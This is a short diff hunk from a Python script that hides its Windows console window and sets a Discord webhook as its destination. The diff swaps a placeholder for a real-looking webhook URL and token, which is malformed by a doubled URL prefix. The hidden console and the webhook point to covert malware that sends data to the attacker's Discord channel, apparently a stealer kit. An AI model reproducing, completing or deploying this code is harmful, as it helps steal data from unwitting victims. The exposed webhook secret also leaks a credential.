@@ -7,7 +7,7 @@ import ctypes
 import sys
 
 # === ⚠️ CHANGE THIS TO YOUR DISCORD WEBHOOK ===
-WEBHOOK = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXX"  # ← PASTE YOUR LINK HERE
+WEBHOOK = "https://discord.com/api/webhooks/https://discordapp.com/api/webhooks/1547609479242326016/XUwdWXwfxnJFELuClPeFiTWLqti8o4o86gVD6y8fRk2uzBwq8du5t58L3uMZ7WlN_wA4"  # ← PASTE YOUR LINK HERE
 
 # Hide console window
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
